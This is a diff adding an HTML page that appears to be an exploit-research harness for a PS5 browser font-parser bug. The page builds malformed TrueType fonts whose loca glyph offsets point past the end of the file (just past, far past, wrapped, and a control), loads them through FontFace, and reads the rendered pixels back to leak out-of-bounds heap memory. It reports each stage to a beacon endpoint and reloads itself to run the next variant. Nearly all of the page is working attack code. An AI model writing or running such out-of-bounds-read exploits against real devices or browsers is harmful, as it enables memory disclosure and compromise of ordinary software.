@@ -1,0 +1,204 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1182 Font Loca OOB Pixel Oracle</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
+#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
+#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
+#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
+#phase{font-size:16px;color:#00ffee}
+#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
+#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
+max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="hud">
+  <h1>P1182 — FONT LOCA OOB PIXEL ORACLE</h1>
+  <div id="status">BOOTING...</div>
+  <div id="phase">phase: init</div>
+  <div id="counters">stage: ?</div>
+  <div id="finds">no findings yet</div>
+</div>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),S=document.getElementById('status'),
+PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
+var T0=Date.now();
+function setStatus(t){S.textContent=t;}
+function setPhase(t){PH.textContent='phase: '+t;}
+function setCounters(t){CT.textContent=t;}
+function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1182-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1182: font-parser loca OOB pixel oracle (community open lead p180a/p182:
+   "T5 LOCA-OOB LOADED" — the PS5 parser ACCEPTS loca offsets past EOF).
+   Craft a minimal TTF with a loca table whose glyph offsets point past
+   the font buffer; load via FontFace(ArrayBuffer); render the glyph;
+   getImageData -> the pixel pattern encodes whatever bytes the parser
+   read OOB (adjacent heap) as glyph outlines.
+   Stages: variants with loca offsets just past EOF, far past, negative
+   (uint wrap), and a control (valid loca).
+   ═══════════════════════════════════════════════════════════════════════ */
+
+function u16(v){return v&0xFFFF;}
+function u32(v){return v>>>0;}
+function buildTTF(locaOff,kind){
+  /* minimal sfnt: head, maxp, loca, glyf */
+  var buf=new ArrayBuffer(1024);
+  var dv=new DataView(buf);
+  var w=function(off,val){dv.setUint32(off,val,false);};
+  var h=function(off,val){dv.setUint16(off,val,false);};
+  var i=0;
+  /* offset table */
+  dv.setUint32(i,0x00010000,false);i+=4;
+  h(i,4);i+=2;                       /* numTables */
+  h(i,0);i+=2;h(i,0);i+=2;h(i,0);i+=2; /* searchRange etc */
+  /* table directory (4 entries @ i) */
+  var dirStart=i;
+  var nTables=4;
+  var recs=[];
+  var T={head:0,maxp:1,loca:2,glyf:3};
+  for(var t=0;t<nTables;t++){recs.push(i);i+=16;}
+  /* tables (after directory) */
+  var headOff=i;
+  /* head: version 1.0, fontRevision, ..., indexToLocFormat */
+  w(i,0x00010000);i+=4; w(i,0x00010000);i+=4;
+  w(i,0);i+=4; w(i,0x5F0F3CF5);i+=4; /* magic */
+  h(i,0x0100);i+=2; h(i,8);i+=2;      /* flags, unitsPerEm */
+  /* 16 bytes timestamps */
+  for(var k=0;k<16;k++){dv.setUint8(i,0);i++;}
+  w(i,0);i+=4;w(i,0);i+=4;w(i,0);i+=4;w(i,0);i+=4; /* bbox */
+  h(i,0);i+=2;h(i,0);i+=2;h(i,0);i+=2;h(i,0);i+=2;
+  h(i,0);i+=2;h(i,0);i+=2;h(i,0);i+=2;h(i,0);i+=2;
+  h(i,0);i+=2;                         /* indexToLocFormat: 0=short,1=long */
+  var locFmtOff=i-2;
+  h(locFmtOff,1);                      /* LONG format */
+  i+=2;
+  var maxpOff=i;
+  w(i,0x00010000);i+=4;               /* version 1.0 */
+  h(i,2);i+=2;                         /* numGlyphs = 2 (glyph 0 + glyph 1) */
+  for(var m=0;m<2*12+6;m++){h(i,0);i+=2;} /* rest zero */
+  var locaOffT=i;
+  /* loca: 3 uint32 offsets (numGlyphs+1): glyph1 offset = attacker value */
+  w(i,0);i+=4;                          /* glyph 0 */
+  w(i,locaOff);i+=4;                    /* glyph 1 offset (OOB if > file) */
+  w(i,locaOff+4);i+=4;                  /* glyph 1 end */
+  var glyfOff=i;
+  /* glyf: minimal empty glyph + a simple glyph with 4 points */
+  /* glyph 0 (empty): numberOfContours=0 */
+  h(i,0);i+=2; h(i,0);i+=2;h(i,0);i+=2;h(i,10);i+=2; /* xMin,yMin,xMax,yMax */
+  i+=10;
+  /* glyph 1 (simple): 1 contour, 4 points */
+  h(i,1);i+=2;
+  h(i,0);i+=2;h(i,0);i+=2;h(i,512);i+=2;h(i,512);i+=2;
+  h(i,3);i+=2;                          /* 3 extra endPts */
+  h(i,4);i+=2;                          /* endPtsOfContours[0]=3 */
+  h(i,0);i+=2;                          /* instructionLength=0 */
+  /* flags + coords: 4 points, on-curve */
+  for(var p=0;p<4;p++){dv.setUint8(i,1);i++;}
+  for(var p2=0;p2<4;p2++){h(i,100*p2);i+=2;}
+  for(var p3=0;p3<4;p3++){h(i,100*p3);i+=2;}
+  /* fill table directory records */
+  var tag=function(tagIdx,name){
+    var off=(tagIdx===0)?headOff:(tagIdx===1)?maxpOff:(tagIdx===2)?locaOffT:glyfOff;
+    var len=(tagIdx===0)?54:(tagIdx===1)?(2+2+2*12+6):(tagIdx===2)?12:24;
+    return {off:off,len:len};
+  };
+  var names={0:'head',1:'maxp',2:'loca',3:'glyf'};
+  for(var t2=0;t2<4;t2++){
+    var name=names[t2];
+    for(var c2=0;c2<4;c2++)dv.setUint8(recs[t2]+c2,name.charCodeAt(c2));
+    var gg=tag(t2,name);
+    w(recs[t2]+4,0);                    /* checksum 0 */
+    w(recs[t2]+8,gg.off);
+    w(recs[t2]+12,gg.len);
+  }
+  return buf;
+}
+
+function runVariant(kind,desc){
+  var offs={'past1':700,'past2':900,'past3':1500,'far':4000,'wrap':0xFFFFF000,'ctl':4};
+  var buf=buildTTF(offs[kind],kind);
+  return new Promise(function(res){
+    try{
+      var ff=new FontFace('loca'+Date.now()%1000,buf,{});
+      document.fonts.add(ff);
+      ff.load().then(function(){
+        B('LOADED',kind);
+        var cv=document.createElement('canvas');cv.width=200;cv.height=100;
+        var cx=cv.getContext('2d');
+        cx.fillStyle='#ffffff';
+        try{cx.font='40px loca'+(''+ff.family).replace('loca','loca');}catch(e){cx.font='40px serif';}
+        cx.font='40px "'+ff.family+'"';
+        try{cx.fillText('A',10,60);}catch(e){B('FILL-ERR',kind+':'+String(e.message).slice(0,30));}
+        var pix=cx.getImageData(0,0,200,100);
+        var nz=0,sample=[];
+        for(var i=0;i<pix.data.length;i+=4){
+          var r=pix.data[i],g=pix.data[i+1],b=pix.data[i+2];
+          if(r||g||b){nz++;if(sample.length<10)sample.push(i/4+':'+r+','+g+','+b);}
+        }
+        res({kind:kind,nz:nz,sample:sample.join(' ')});
+      },function(e){res({kind:kind,rej:String(e).slice(0,40)});});
+    }catch(e){res({kind:kind,thr:String(e).slice(0,40)});}
+  });
+}
+
+var STAGES=['past1','past2','past3','far','wrap','ctl'];
+var stage=0,results=[];
+try{stage=parseInt(localStorage.getItem('p1182_stage')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1182_res');if(r)results=JSON.parse(r);}catch(e){}
+if(!Array.isArray(results))results=[];
+B('BOOT','stage='+stage+'|'+STAGES[stage]);
+setStatus('STAGE '+stage+'/5 — '+STAGES[stage]);
+
+if(stage>=STAGES.length){
+  setStatus('ALL DONE');
+  B('ALL-DONE',JSON.stringify(results).slice(0,800));
+  log('=== ALL DONE ===','ok');
+  try{localStorage.removeItem('p1182_stage');}catch(e){}
+}else{
+  try{localStorage.setItem('p1182_stage',''+(stage+1));}catch(e){}
+  var cur=STAGES[stage];
+  setPhase('loca variant '+cur);
+  runVariant(cur).then(function(rr){
+    var rep=JSON.stringify(rr);
+    results.push({stage:stage,name:cur,result:rep});
+    try{localStorage.setItem('p1182_res',JSON.stringify(results));}catch(e){}
+    B('RESULT',rep.slice(0,700));
+    addFind(cur+': '+rep.slice(0,300));
+    setStatus(rep.slice(0,80));
+    log('=== '+cur+' -> '+rep+' ===','ok');
+    B('NEXT');
+    setTimeout(function(){location.reload(true);},700);
+  });
+}
+
+/* auto-reload checker */
+(function(){
+  var cur='P1182-loca-oracle';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
